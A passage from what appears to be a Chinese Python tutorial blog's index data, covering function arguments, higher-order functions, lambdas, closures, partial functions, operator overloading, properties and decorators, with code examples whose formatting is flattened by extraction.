takes exactly 2 arguments (1 given)&gt;&gt;&gt; add(1, 2) # 数量一致，通过3``` ## 0x1.2.2默认参数 默认参数是指在定义函数的时候提供一些默认值，如果在调用函数的时候没有传递该参数，则自动使用默认值，否则使用传递时该参数的值。 看看例子就明白了：```bash&gt;&gt;&gt; def add(x, y, z=1): # x, y 是必选参数，z 是默认参数，默认值是 1... print x + y + z...&gt;&gt;&gt; add(1, 2, 3) # 1+2+36&gt;&gt;&gt; add(1, 2) # 没有传递 z，自动使用 z=1，即 1+2+14 可以看到，默认参数使用起来也很简单，但有两点需要注意的是： 默认参数要放在所有必选参数的后面 默认参数应该使用不可变对象 比如，下面对默认参数的使用是错误的： 1234567891011&gt;&gt;&gt; def add(x=1, y, z): # x 是默认参数，必须放在所有必选参数的后面... return x + y + z... File \"&lt;stdin&gt;\", line 1SyntaxError: non-default argument follows default argument&gt;&gt;&gt;&gt;&gt;&gt; def add(x, y=1, z): # y 是默认参数，必须放在所有必选参数的后面... return x + y + z... File \"&lt;stdin&gt;\", line 1SyntaxError: non-default argument follows default argument 再来看看为什么默认参数应该使用不可变对象。 我们看一个例子： 123&gt;&gt;&gt; def add_to_list(L=[]):... L.append('END')... return L 在上面的函数中，L 是一个默认参数，默认值是 []，表示空列表。 我们来看看使用： 12345678910&gt;&gt;&gt; add_to_list([1, 2, 3]) # 没啥问题[1, 2, 3, 'END']&gt;&gt;&gt; add_to_list(['a', 'b', 'c']) # 没啥问题['a', 'b', 'c', 'END']&gt;&gt;&gt; add_to_list() # 没有传递参数，使用默认值，也没啥问题['END']&gt;&gt;&gt; add_to_list() # 没有传递参数，使用默认值，竟出现两个 'END'['END', 'END']&gt;&gt;&gt; add_to_list() # 糟糕了，三个 'END'['END', 'END', 'END'] 为啥呢？我们在调用函数的时候没有传递参数，那么就默认使用 L=[]，经过处理，L 应该只有一个元素，怎么会出现调用函数两次，L 就有两个元素呢？ 原来，L 指向了可变对象 []，当你调用函数时，L 的内容发生了改变，默认参数的内容也会跟着变，也就是，当你第一次调用时，L 的初始值是 []，当你第二次调用时，L 的初始值是 [‘END’]，等等。 所以，为了避免不必要的错误，我们应该使用不可变对象作为函数的默认参数。 0x1.2.3可变参数在某些情况下，我们在定义函数的时候，无法预估函数应该制定多少个参数，这时我们就可以使用可变参数了，也就是，函数的参数个数是不确定的。 看看例子： 123456&gt;&gt;&gt; def add(*numbers):... sum = 0... for i in numbers:... sum += i... print 'numbers:', numbers... return sum 在上面的代码中，numbers 就是一个可变参数，参数前面有一个 * 号，表示是可变的。在函数内部，参数 numbers 接收到的是一个 tuple。 在调用函数时，我们可以给该函数传递任意个参数，包括 0 个参数： 123456789101112&gt;&gt;&gt; add() # 传递 0 个参数numbers: ()0&gt;&gt;&gt; add(1) # 传递 1 个参数numbers: (1,)1&gt;&gt;&gt; add(1, 2) # 传递 2 个参数numbers: (1, 2)3&gt;&gt;&gt; add(1, 2, 3) # 传递 3 个参数numbers: (1, 2, 3)6 上面的 * 表示任意参数，实际上，它还有另外一个用法：用来给函数传递参数。 看看例子： 1234567891011&gt;&gt;&gt; def add(x, y, z): # 有 3 个必选参数... return x + y + z...&gt;&gt;&gt; a = [1, 2, 3]&gt;&gt;&gt; add(a[0], a[1], a[2]) # 这样传递参数很累赘6&gt;&gt;&gt; add(*a) # 使用 *a，相当于上面的做法6&gt;&gt;&gt; b = (4, 5, 6)&gt;&gt;&gt; add(*b) # 对元组一样适用15 再看一个例子： 123456789101112&gt;&gt;&gt; def add(*numbers): # 函数参数是可变参数... sum = 0... for i in numbers:... sum += i... return sum...&gt;&gt;&gt; a = [1, 2]&gt;&gt;&gt; add(*a) # 使用 *a 给函数传递参数3&gt;&gt;&gt; a = [1, 2, 3, 4]&gt;&gt;&gt; add(*a)10 0x1.2.4关键字参数可变参数允许你将不定数量的参数传递给函数，而关键字参数则允许你将不定长度的键值对, 作为参数传递给一个函数。 让我们看看例子： 12345678&gt;&gt;&gt; def add(**kwargs): return kwargs&gt;&gt;&gt; add() # 没有参数，kwargs 为空字典&#123;&#125;&gt;&gt;&gt; add(x=1) # x=1 =&gt; kwargs=&#123;'x': 1&#125;&#123;'x': 1&#125;&gt;&gt;&gt; add(x=1, y=2) # x=1, y=2 =&gt; kwargs=&#123;'y': 2, 'x': 1&#125;&#123;'y': 2, 'x': 1&#125; 在上面的代码中，kwargs 就是一个关键字参数，它前面有两个 * 号。kwargs 可以接收不定长度的键值对，在函数内部，它会表示成一个 dict。 和可变参数类似，我们也可以使用 **kwargs 的形式来调用函数，比如： 12345678&gt;&gt;&gt; def add(x, y, z):... return x + y + z...&gt;&gt;&gt; dict1 = &#123;'z': 3, 'x': 1, 'y': 6&#125;&gt;&gt;&gt; add(dict1['x'], dict1['y'], dict1['z']) # 这样传参很累赘10&gt;&gt;&gt; add(**dict1) # 使用 **dict1 来传参，等价于上面的做法10 再看一个例子： 12345678910111213&gt;&gt;&gt; def sum(**kwargs): # 函数参数是关键字参数... sum = 0... for k, v in kwargs.items():... sum += v... return sum&gt;&gt;&gt; sum() # 没有参数0&gt;&gt;&gt; dict1 = &#123;'x': 1&#125;&gt;&gt;&gt; sum(**dict1) # 相当于 sum(x=1)1&gt;&gt;&gt; dict2 = &#123;'x': 2, 'y': 6&#125; &gt;&gt;&gt; sum(**dict2) # 相当于 sum(x=2, y=6)8 0x1.2.5参数组合在实际的使用中，我们经常会同时用到必选参数、默认参数、可变参数和关键字参数或其中的某些。但是,需要注意的是，它们在使用的时候是有顺序的，依次是必选参数、默认参数、可变参数和关键字参数。 比如，定义一个包含上述四种参数的函数： 123456&gt;&gt;&gt; def func(x, y, z=0, *args, **kwargs): print 'x =', x print 'y =', y print 'z =', z print 'args =', args print 'kwargs =', kwargs 在调用函数的时候，Python 会自动按照参数位置和参数名把对应的参数传进去。让我们看看： 123456789101112131415161718192021222324252627282930&gt;&gt;&gt; func(1, 2) # 至少提供两个参数，因为 x, y 是必选参数x = 1y = 2z = 0args = ()kwargs = &#123;&#125;&gt;&gt;&gt; func(1, 2, 3) # x=1, y=2, z=3x = 1y = 2z = 3args = ()kwargs = &#123;&#125;&gt;&gt;&gt; func(1, 2, 3, 4, 5, 6) # x=1, y=2, z=3, args=(4, 5, 6), kwargs=&#123;&#125;x = 1y = 2z = 3args = (4, 5, 6)kwargs = &#123;&#125;&gt;&gt;&gt; func(1, 2, 4, u=6, v=7) # args = (), kwargs = &#123;'u': 6, 'v': 7&#125;x = 1y = 2z = 4args = ()kwargs = &#123;'u': 6, 'v': 7&#125;&gt;&gt;&gt; func(1, 2, 3, 4, 5, u=6, v=7) # args = (4, 5), kwargs = &#123;'u': 6, 'v': 7&#125;x = 1y = 2z = 3args = (4, 5)kwargs = &#123;'u': 6, 'v': 7&#125; 我们还可以通过下面的形式来传递参数： 12345678&gt;&gt;&gt; a = (1, 2, 3)&gt;&gt;&gt; b = &#123;'u': 6, 'v': 7&#125;&gt;&gt;&gt; func(*a, **b)x = 1y = 2z = 3args = ()kwargs = &#123;'u': 6, 'v': 7&#125; 0x2内置高阶函数在函数式编程中，我们可以将函数当作变量一样自由使用。一个函数接收另一个函数作为参数，这种函数称之为高阶函数（Higher-order Functions）。看一个简单的例子： 12def func(g, arr): return [g(x) for x in arr] 上面的代码中，func 是一个高阶函数，它接收两个参数，第 1 个参数是函数，第 2 个参数是数组，func 的功能是将函数 g 逐个作用于数组 arr 上，并返回一个新的数组，比如，我们可以这样用： 12345678def double(x): return 2 * xdef square(x): return x * xarr1 = func(double, [1, 2, 3, 4])arr2 = func(square, [1, 2, 3, 4]) 不难判断出，arr1 是 [2, 4, 6, 8]，arr2 是 [1, 4, 9, 16]。 map/reduce/filter 是 Python 中较为常用的内建高阶函数，它们为函数式编程提供了不少便利。注意在 python2 和 python3 中，map/reduce/filter 的返回值类型有所不同，python2 返回的是基本数据类型，而 python3 则返回了迭代器； 0x2.1 mapmap 函数的使用形式如下： 1map(function, sequence) 解释：对 sequence 中的 item 依次执行 function(item)，并将结果组成一个 List 返回，也就是： 1[function(item1), function(item2), function(item3), ...] 看一些简单的例子。 1234567891011121314&gt;&gt;&gt; def square(x):... return x * x&gt;&gt;&gt; map(square, [1, 2, 3, 4])[1, 4, 9, 16]&gt;&gt;&gt; map(lambda x: x * x, [1, 2, 3, 4]) # 使用 lambda[1, 4, 9, 16]&gt;&gt;&gt; map(str, [1, 2, 3, 4])['1', '2', '3', '4']&gt;&gt;&gt; map(int, ['1', '2', '3', '4'])[1, 2, 3, 4] 再看一个例子： 12345678910def double(x): return 2 * xdef triple(x): return 3 *xdef square(x): return x * xfuncs = [double, triple, square] # 列表元素是函数对象# 相当于 [double(4), triple(4), square(4)]value = list(map(lambda f: f(4), funcs))print(value) 0x2.2reducereduce 函数的使用形式如下： 1reduce(function, sequence[, initial]) 解释：先将 sequence 的前两个 item 传给 function，即 function(item1, item2)，函数的返回值和 sequence 的下一个 item 再传给 function，即 function(function(item1, item2), item3)，如此迭代，直到 sequence 没有元素，如果有 initial，则作为初始值调用。 也就是说： 1reduece(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4) 看一些例子，就能很快理解了。 12345678910111213&gt;&gt;&gt; reduce(lambda x, y: x * y, [1, 2, 3, 4]) # 相当于 ((1 * 2) * 3) * 424&gt;&gt;&gt; reduce(lambda x, y: x * y, [1, 2, 3, 4], 5) # ((((5 * 1) * 2) * 3)) * 4120&gt;&gt;&gt; reduce(lambda x, y: x / y, [2, 3, 4], 72) # (((72 / 2) / 3)) / 43&gt;&gt;&gt; reduce(lambda x, y: x + y, [1, 2, 3, 4], 5) # ((((5 + 1) + 2) + 3)) + 415&gt;&gt;&gt; reduce(lambda x, y: x - y, [8, 5, 1], 20) # ((20 - 8) - 5) - 16&gt;&gt;&gt; f = lambda a, b: a if (a &gt; b) else b # 两两比较，取最大值&gt;&gt;&gt; reduce(f, [5, 8, 1, 10])10 0x2.3filterfilter 函数用于过滤元素，它的使用形式如下： 1filter(function, sequnce) 解释：将 function 依次作用于 sequnce 的每个 item，即 function(item)，将返回值为 True 的 item 组成一个 List/String/Tuple (取决于 sequnce 的类型，python3 统一返回迭代器) 返回。 看一些例子。 12345678910&gt;&gt;&gt; even_num = list(filter(lambda x: x % 2 == 0, [1, 2, 3, 4, 5, 6]))&gt;&gt;&gt; even_num[2, 4, 6]&gt;&gt;&gt; odd_num = list(filter(lambda x: x % 2, [1, 2, 3, 4, 5, 6]))&gt;&gt;&gt; odd_num[1, 3, 5]&gt;&gt;&gt; filter(lambda x: x &lt; 'g', 'hijack')'ac' # python2&gt;&gt;&gt; filter(lambda x: x &lt; 'g', 'hijack')&lt;filter object at 0x1034b4080&gt; # python3 0x2.4sortedsorted() 也是一个高阶函数，接收一个函数来实现自定义的排序。 例如按绝对值排序代码： 12345678print(sorted([-34,5,-2,43],key=abs))``` # 0x3匿名函数 在 Python 中，我们使用 def 语句来定义函数，比如：```bashdef double(x): return 2 * x 除了用上面的方式定义函数，Python 还提供了一个关键字 lambda，让我们可以创建一个匿名函数，也就是没有名称的函数。它的形式如下： lambda 参数: 表达式关键字 lambda 说明它是一个匿名函数，冒号 : 前面的变量是该匿名函数的参数，冒号后面是函数的返回值，注意这里不需使用 return 关键字。 我们将上面的 double 函数改写成一个匿名函数，如下： 1lambda x: 2 * x 那怎么调用匿名函数呢？可以直接这样使用： 12&gt;&gt;&gt; (lambda x: 2 * x)(8)16 由于匿名函数本质上是一个函数对象，也可以将其赋值给另一个变量，再由该变量来调用函数，如下： 12345&gt;&gt;&gt; f = lambda x: 2 * x # 将匿名函数赋给变量 f &gt;&gt;&gt; f&lt;function &lt;lambda&gt; at 0x7f835a696578&gt;&gt;&gt;&gt; f(8)16 使用场景lambda 函数一般适用于创建一些临时性的，小巧的函数。比如上面的 double 函数，我们当然可以使用 def 来定义，但使用 lambda 来创建会显得很简洁，尤其是在高阶函数的使用中。 看一个例子： 12def func(g, arr): return [g(x) for x in arr] 现在给一个列表 [1, 2, 3, 4]，利用上面的函数，对列表中的元素加 1，返回一个新的列表，你可能这样用： 1234def add_one(x): return x + 1arr = func(add_one, [1, 2, 3, 4]) 这样做没什么错，可是 add_one 这个函数太简单了，使用 def 定义未免有点小题大作，我们改用 lambda： 1arr = func(lambda x: x + 1, [1, 2, 3, 4]) 是不是很简洁、易懂？ 0x4闭包闭包的一些注意点: 闭包是携带自由变量的函数，即使创建闭包的外部函数的生命周期结束了，闭包所引用的自由变量仍会存在。 闭包在运行可以有多个实例。 尽量不要在闭包中引用循环变量，或者后续会发生变化的变量。 0x4.1闭包理解在 Python 中，函数也是一个对象。因此，我们在定义函数时，可以再嵌套定义一个函数，并将该嵌套函数返回，比如： 123456from math import powdef make_pow(n): def inner_func(x): # 嵌套定义了 inner_func return pow(x, n) # 注意这里引用了外部函数的 n return inner_func # 返回 inner_func 上面的代码中，函数 make_pow 里面又定义了一个内部函数 inner_func，然后将该函数返回。因此，我们可以使用 make_pow 来生成另一个函数： 12345&gt;&gt;&gt; pow2 = make_pow(2) # pow2 是一个函数，参数 2 是一个自由变量&gt;&gt;&gt; pow2&lt;function inner_func at 0x10271faa0&gt;&gt;&gt;&gt; pow2(6)36.0 我们还注意到，内部函数 inner_func 引用了外部函数 make_pow 的自由变量 n，这也就意味着，当函数 make_pow 的生命周期结束之后，n 这个变量依然会保存在 inner_func 中，它被 inner_func 所引用。 1234567&gt;&gt;&gt; del make_pow # 删除 make_pow&gt;&gt;&gt; pow3 = make_pow(3)Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;NameError: name 'make_pow' is not defined&gt;&gt;&gt; pow2(9) # pow2 仍可正常调用，自由变量 2 仍保存在 pow2 中81.0 像上面这种情况，一个函数返回了一个内部函数，该内部函数引用了外部函数的相关参数和变量，我们把该返回的内部函数称为闭包（Closure）。 在上面的例子中，inner_func 就是一个闭包，它引用了自由变量 n。 0x4.2闭包的作用 闭包的最大特点就是引用了自由变量，即使生成闭包的环境已经释放，闭包仍然存在。 闭包在运行时可以有多个实例，即使传入的参数相同。1234&gt;&gt;&gt; pow_a = make_pow(2)&gt;&gt;&gt; pow_b = make_pow(2)&gt;&gt;&gt; pow_a == pow_bFalse 利用闭包，我们还可以模拟类的实例。这里构造一个类，用于求一个点到另一个点的距离： 12345678910111213from math import sqrtclass Point(object): def __init__(self, x, y): self.x, self.y = x, y def get_distance(self, u, v): distance = sqrt((self.x - u) ** 2 + (self.y - v) ** 2) return distance&gt;&gt;&gt; pt = Point(7, 2) # 创建一个点&gt;&gt;&gt; pt.get_distance(10, 6) # 求到另一个点的距离5.0 用闭包来实现： 123456789def point(x, y): def get_distance(u, v): return sqrt((x - u) ** 2 + (y - v) ** 2) return get_distance&gt;&gt;&gt; pt = point(7, 2)&gt;&gt;&gt; pt(10, 6)5.0 可以看到，结果是一样的，但使用闭包实现比使用类更加简洁。 0x4.3闭包的误区闭包的概念很简单，但实现起来却容易出现一些误区，比如下面的例子： 1234567def count(): funcs = [] for i in [1, 2, 3]: def f(): return i funcs.append(f) return funcs 在该例子中，我们在每次 for 循环中创建了一个函数，并将它存到 funcs 中。现在，调用上面的函数，你可能认为返回结果是 1, 2, 3，事实上却不是： 1234567&gt;&gt;&gt; f1, f2, f3 = count()&gt;&gt;&gt; f1()3&gt;&gt;&gt; f2()3&gt;&gt;&gt; f3()3 为什么呢？原因在于上面的函数 f 引用了变量 i，但函数 f 并非立刻执行，当 for 循环结束时，此时变量 i 的值是3，funcs 里面的函数引用的变量都是 3，最终结果也就全为 3。 因此，我们应尽量避免在闭包中引用循环变量，或者后续会发生变化的变量。 那上面这种情况应该怎么解决呢？我们可以再创建一个函数，并将循环变量的值传给该函数，如下： 12345678910111213141516def count(): funcs = [] for i in [1, 2, 3]: def g(param): f = lambda : param # 这里创建了一个匿名函数 return f funcs.append(g(i)) # 将循环变量的值传给 g return funcs&gt;&gt;&gt; f1, f2, f3 = count()&gt;&gt;&gt; f1()1&gt;&gt;&gt; f2()2&gt;&gt;&gt; f3()3 0x5偏函数(partial) partial() 接受参数 (function, arg1, arg2, …, kwarg1=value1,kwarg2=value2)。 partial 的功能：固定函数参数，返回一个新的函数。 当函数参数太多，需要固定某些参数时，可以使用 functools.partial 创建一个新的函数。 Python 提供了一个 functools 的模块，该模块为高阶函数提供支持，partial 就是其中的一个函数，该函数的形式如下： 1functools.partial(func[,*args][, **kwargs]) 这里先举个例子，看看它是怎么用的。 假设有如下函数： 12def multiply(x, y): return x * y 现在，我们想返回某个数的双倍，即： 123456&gt;&gt;&gt; multiply(3, y=2)6&gt;&gt;&gt; multiply(4, y=2)8&gt;&gt;&gt; multiply(5, y=2)10 上面的调用有点繁琐，每次都要传入 y=2，我们想到可以定义一个新的函数，把 y=2 作为默认值，即： 12def double(x, y=2): return multiply(x, y) 现在，我们可以这样调用了： 123456&gt;&gt;&gt; double(3)6&gt;&gt;&gt; double(4)8&gt;&gt;&gt; double(5)10 事实上，我们可以不用自己定义 double，利用 partial，我们可以这样： 123from functools import partialdouble = partial(multiply, y=2) partial 接收函数 multiply 作为参数，固定 multiply 的参数 y=2，并返回一个新的函数给 double，这跟我们自己定义 double 函数的效果是一样的。 所以，简单而言，partial 函数的功能就是：把一个函数的某些参数给固定住，返回一个新的函数。 需要注意的是，我们上面是固定了 multiply 的关键字参数 y=2，如果直接使用： 1double = partial(multiply, 2) 则 2 是赋给了 multiply 最左边的参数 x，不信？我们可以验证一下： 12345678from functools import partialdef subtraction(x, y): return x - yf = partial(subtraction, 4) # 4 赋给了 x&gt;&gt;&gt; f(10) # 4 - 10-6 0x6装饰器详细可看:http://funhacks.net/explore-python/Functional/decorator.html 参考文章:函数编程: http://funhacks.net/explore-python/Function/","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"函数","slug":"函数","permalink":"https://blog.cfyqy.com/tags/%E5%87%BD%E6%95%B0/"}],"author":"ye1s"},{"title":"python的元编程","slug":"python的元编程","date":"2019-05-31T01:49:00.000Z","updated":"2020-04-13T08:17:38.425Z","comments":true,"path":"article/cf5605e2.html","link":"","permalink":"https://blog.cfyqy.com/article/cf5605e2.html","excerpt":"简而言之，元编程就是关于创建操作源代码(比如修改、生成或包装原来的代码)的函数和类。","text":"简而言之，元编程就是关于创建操作源代码(比如修改、生成或包装原来的代码)的函数和类。 元编程简介 接下来让我来一步步介绍(误导)对 python 元编程细节的认识 python类在实例化对象的时候，经历了三个阶段： 第一个阶段是生成（每个类对象只会被生成一次）自己的类对象，靠元类的 __new__() 方法 第二个阶段是生成自己的类实例，靠的是类自己的__new__方法 第三个阶段是初始化类实例，靠的是类自己的 __init__() 方法。 当类对象被创建前，python2 会首先寻找 __metaclass__ 属性是否存在，如果存在则调用__metaclass__属性指定的元类去初始化这个类对象。如果该类没定义 __metaclass__就去看他父类是否有定义，父类没有就去模块里找（全局变量__metaclass__），模块里再没有就把__metaclass__ = type 作为该类的元类。（python3是先看自己metaclass有没有定义，如果没有就看父类，父类没有就用type） 再介绍下 __new__函数中参数的意思：cls 代表调用__new__()函数的 class，handler_class_name 代表对象的__name__值，也就是名称，super_class_name 代表对象的父类元组，property_dict 代表类的属性字典，和之前的 type 是一样的。 python的元编程主要实现方式有: 加载时修改代码行为 运算符重载 装饰器 元类编程 描述符 import hook 运行时改变代码行为 动态编译 动态属性 猴子补丁和热更新 元类一般来说是用不上的，除非要大批量的修改类的属性。 0x1.运算符重载运算符重载在任何语言中都算得上是高级特性,因为它可以改变语言本身即元编程. Python支持有限的运算符重载,并有几个特殊的运算符可以改变类的一些特性. 受限制的运算符重载在某些圈子中,运算符重载的名声并不好.这个语言特性可能(已经)被滥用,让程序员困惑,导致缺陷和意料之外的性能瓶颈.但是,如果使用得当,API会变得好用,代码会变得易于阅读.Python施加了一些限制,做好了灵活性、可用性和安全性方面的平衡： 不能重载内置类型的运算符 不能新建运算符,只能重载现有的 某些运算符不能重载——is、and、or 和not（不过位运算符&amp;、| 和~ 可以） 下面是python所有可以重载的运算符以及对应的特殊方法: 一元运算符 特殊方法 + pos - neg ~ invert abs(…) abs 二元运算符 特殊方法 + add,radd += iaddr - sub,rsub * mul,rmul / div,rdiv,truediv,rtruediv // floordiv,rfloordiv % mod,rmod ** pow,rpow &lt;&lt; lshift,rlshift &gt;&gt; rshift,rrshift &amp; and,rand ^ xor,rxor l or,_ror -= isub *= imul /= idiv,itruediv //= ifloordiv %= imod **= ipow &lt;&lt;= ilshift &gt;&gt;= irshift &amp;= iand ^= ixor l= ior == eq !=,&lt;&gt; ne &gt; get &lt; lt &gt;= ge &lt;= le @ matmul(),rmatmul() @= imatmul() 范例:定义一个数组类,实现减法索引打印等操作 123456789101112131415161718192021222324252627class Array: def __init__(self,*args):#构造函数 self.value = args def __sub__(self,other):#减法运算符 if isinstance(other,(int ,float)): new = Array(*list(map(lambda x : x-other,self.value))) return new if isinstance(other,Array): new = Array(*list(map(lambda x,y : x-y,self.value,other.value))) return new else: raise ValueError(\"Illegal operations\") def __repr__(self):#打印 return \"Array: \"+str(self.value) def __str__(self):#字符串化 return \"Array: \"+str(self.value) def __getitem__(self,index):#索引分片,有了分片也就有了迭代,但不如迭代器好 new = Array(*self.value[index]) return newarr1=Array(1,2,3,4)arr2=Array(10,20,30,40)print(arr2-arr1)output:Array: (9, 18, 27, 36) 0x2特性与描述符除了属性之外,我们还可以创建特性(property),在不改变类接口的前提下,使用存取方法(即读值方法和设值方法)修改数据属性.这与统一访问原则相符–不管服务是由存储还是计算实现的,一个模块提供的所有服务都应该通过统一的方式使用. property是一个用于类中方法的装饰器,用于将方法属性转换为特性,如果要设定特性的增删改查能力,则可以使用.setter,.deleter定义. 12345678910111213class Event(DbRecord): @property def venue(self): '''The Event attribute''' return self.__venue @venue.setter def venue(self,value): self.__venue = value @venue.deleter def venue(self,value): del self.__venue 虽然内置的property经常用作装饰器,但它其实是一个类.在Python中,函数和类通常可以互换,因为二者都是可调用的对象,而且没有实例化对象的new运算符,所以调用构造方法与调用工厂函数没有区别.此外,只要能返回新的可调用对象,代替被装饰的函数,二者都可以用作装饰器. property构造方法的完整签名如下： 1property(fget=None, fset=None, fdel=None, doc=None) 所有参数都是可选的,如果没有把函数传给某个参数,那么得到的特性对象就不允许执行相应的操作. 某些情况下,这种经典形式比装饰器句法好.但是在方法众多的类定义体中使用装饰器的话,一眼就能看出哪些是读值方法,哪些是设值方法,而不用按照惯例在方法名的前面加上get和set.类中的特性能影响实例属性的寻找方式,而一开始这种方式可能会让人觉得意外. 特性都是类属性,但是特性管理的其实是实例属性的存取.如果实例和所属的类有同名数据属性,那么实例属性会覆盖(或称遮盖)类属性–至少通过那个实例读取属性时是这样.0x2.1实例属性遮盖类的数据属性 123456789101112131415161718192021class Class: data = 'the class data attr' @property def prop(self): return 'the prop value'obj=Class()print(vars(obj))print(obj.data)obj.data='bar'print(vars(obj))print(obj.data)print(Class.data)output:&#123;&#125;the class data attr&#123;'data': 'bar'&#125;barthe class data attr 0x2.2实例属性不会遮盖类特性 12345678910class Class: data = 'the class data attr' @property def prop(self): return 'the prop value'obj=Class()print(Class.prop)print(obj.prop)obj.__dict__['prop'] = 'foo'print(vars(obj)) 0x2.3新添的类特性遮盖现有的实例属性 1234567891011class Class: data = 'the class data attr' @property def prop(self): return 'the prop value'obj=Class()obj.data='bar'print(obj.data)print(Class.data)Class.data = property(lambda self: 'the \"data\" prop value')print(obj.data) 0x2.4特性的文档控制台中的help()函数或IDE等工具需要显示特性的文档时,会从特性的doc属性中提取信息. 如果使用经典调用句法,为property对象设置文档字符串的方法是传入doc参数: 1weight = property(get_weight, set_weight, doc='weight in kilograms') 使用装饰器创建property对象时,读值方法(有@property装饰器的方法)的文档字符串作为一个整体,变成特性的文档.0x2.0x2.0x2.0x2.0x2.0x2.0x2.0x2.0x2.0x2.0x2.0x2.0x2. 0x3装饰器函数装饰器用于在源码中”标记”函数,以某种方式增强函数的行为.严格来说装饰器这种形式是一种语法糖. 0x3.1装饰器的定义装饰器本质上是一个Python函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。 0x3.2装饰器的特点: 装饰器是可调用的对象,其参数是另一个可调用对象. 装饰器可能会处理被装饰的可调用对象,然后把它返回,或者将其替换成另一个可调用对象 装饰器在加载模块时立即执行装饰器的形式如下:123@decoratordef call(args): pass 它等价于 call(args) = decorator(call(args)) *0x3.3装饰器的属性: * 实质： 是一个函数 参数：是你要装饰的函数名（并非函数调用） 返回：是装饰完的函数名（也非函数调用） 作用：为已经存在的对象添加额外的功能 特点：不需要对对象做任何的代码上的变动 *0x3.4装饰器的作用: * 它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码并继续重用。 概括的讲，装饰器的作用就是为已经存在的函数或对象添加额外的功能。0x3.5常见的装饰器0x3.5.1函数装饰器编写自定义装饰器有许多方法，但最简单的方法是编写一个函数，返回包装原始函数调用的一个子函数例子1： 12345678910111213141516171819202122def debug(func): def wrapper(*agrs, **kwargs): '''包装函数内部文档''' print (\"[DEBUG]:enter %s()--%s\" %(func.__name__, *agrs)) return func(*agrs, **kwargs) return wrapper@debugdef say_hello(parm): ''' 提供函数文档字符串''' print (\"say_hello\")if __name__ == \"__main__\": say_hello(\"Python\") print (\"原始函数名：%s\" %(say_hello.__name__)) print (\"函数文档字符串：%s\" %(say_hello.__doc__))output:[DEBUG]:enter say_hello()--Pythonsay_hello原始函数名：wrapper函数文档字符串：包装函数内部文档 例子2: 12345678910111213141516171819202122232425from functools import wrapsdef debug(func): @wraps(func) def wrapper(*agrs, **kwargs): '''包装函数内部文档''' print (\"[DEBUG]:enter %s()--%s\" %(func.__name__, *agrs)) return func(*agrs, **kwargs) return wrapper@debugdef say_hello(parm): ''' 提供函数文档字符串''' print (\"say_hello\")if __name__ == \"__main__\": say_hello(\"Python\") print (\"原始函数名：%s\" %(say_hello.__name__)) print (\"函数文档字符串：%s\" %(say_hello.__doc__))output:[DEBUG]:enter say_hello()--Pythonsay_hello原始函数名：say_hello函数文档字符串： 提供函数文档字符串 注意例1与例2的区别，也是使用装饰器的常用错误，在使用装饰器时不保存函数元数据（文档字符串和原始函数名） 0x3.5.2 类作为装饰器装饰器不仅可以是函数，还可以是类，相比函数装饰器，类装饰器具有灵活度大、高内聚、封装性等优点。使用类装饰器主要依靠类的call方法，当使用 @ 形式将装饰器附加到函数上时，就会调用此方法。 123456789101112131415161718192021222324class debug: def __init__(self, func): self.func = func def __call__(self, *argv, **kwargv): '''包装函数内部文档''' print (\"[DEBUG]:enter %s()--%s\" %(self.func.__name__, *argv)) self.func(*argv, **kwargv)def say_hello(something): ''' 提供函数文档字符串 ''' print (\"say_hello\", something)if __name__ == \"__main__\": De = debug(say_hello) De(\"Python\") print (\"原始函数名：%s\" %(say_hello.__name__)) print (\"函数文档字符串：%s\" %(say_hello.__doc__))ouput:[DEBUG]:enter say_hello()--Pythonsay_hello Python原始函数名：say_hello函数文档字符串： 提供函数文档字符串 0x3.5.3参数化装饰器 在实际代码中通常需要使用参数化的装饰器，比如次数、类型判断等，下面是一个简单的装饰器示例，给定重复次数，每次被调用时都会重复执行被装饰函数 12345678910111213141516171819202122232425262728293031323334from functools import wraps#参数化装饰器def repeat(number=3): def debug(func): @wraps(func) def wrapper(*argv, **kwargv): '''包装函数内部文档''' for _ in range(number): print (\"[DUBEG]:enter %s()--%s\" %(func.__name__, *argv)) result = func(*argv, **kwargv) return result return wrapper return debug@repeat(2)def say_hello(*agrv, **kwargv): '''提供函数文档字符串''' print (\"say_hello\")if __name__ == \"__main__\": say_hello(\"Python\") print (\"原始函数名：%s\" %(say_hello.__name__)) print (\"函数文档字符串：%s\" %(say_hello.__doc__))output:[DUBEG]:enter say_hello()--Pythonsay_hello[DUBEG]:enter say_hello()--Pythonsay_hello原始函数名：say_hello函数文档字符串：提供函数文档字符串 0x3.5.4装饰器装饰类 和装饰一个函数类似，也可以写一个函数来装饰类，用来向类中添加功能，基本原则一致，装饰器是一个函数或是一个可调用对象，它接受一个类作为参数，返回一个类作为返回值 1234567891011121314def decoratortest(cls): print (\"&#123;0.__class__.__qualname__&#125;\".format(cls)) return cls@decoratortestclass testclass: def __init__(self, value): self.value = value def __repr__(self): return \"&#123;0&#125;:88\".format(self)if __name__ == \"__main__\": t = testclass(88) 0x3.5.5内置的装饰器*@property *在了解这个装饰器前，你需要知道在不使用装饰器怎么写一个属性。 1234567891011def getx(self): return self._xdef setx(self, value): self._x = value def delx(self): del self._x# create a propertyx = property(getx, setx, delx, \"I am doc for x property\") 以上就是一个Python属性的标准写法，其实和Java挺像的，但是太罗嗦。有了@语法糖，能达到一样的效果但看起来更简单。 1234567@propertydef x(self): ...# 等同于def x(self): ...x = property(x) 属性有三个装饰器：setter, getter, deleter ，都是在property()的基础上做了一些封装，因为setter和deleter是property()的第二和第三个参数，不能直接套用@语法。getter装饰器和不带getter的属性装饰器效果是一样的，估计只是为了凑数，本身没有任何存在的意义。经过@property装饰过的函数返回的不再是一个函数，而是一个property对象。 12&gt;&gt;&gt; property()&lt;property object at 0x10ff07940&gt; @staticmethod，@classmethod 有了@property装饰器的了解，这两个装饰器的原理是差不多的。@staticmethod返回的是一个staticmethod类对象，而@classmethod返回的是一个classmethod类对象。他们都是调用的是各自的init()构造函数。 1234567891011121314class classmethod(object): \"\"\" classmethod(function) -&gt; method \"\"\" def __init__(self, function): # for @classmethod 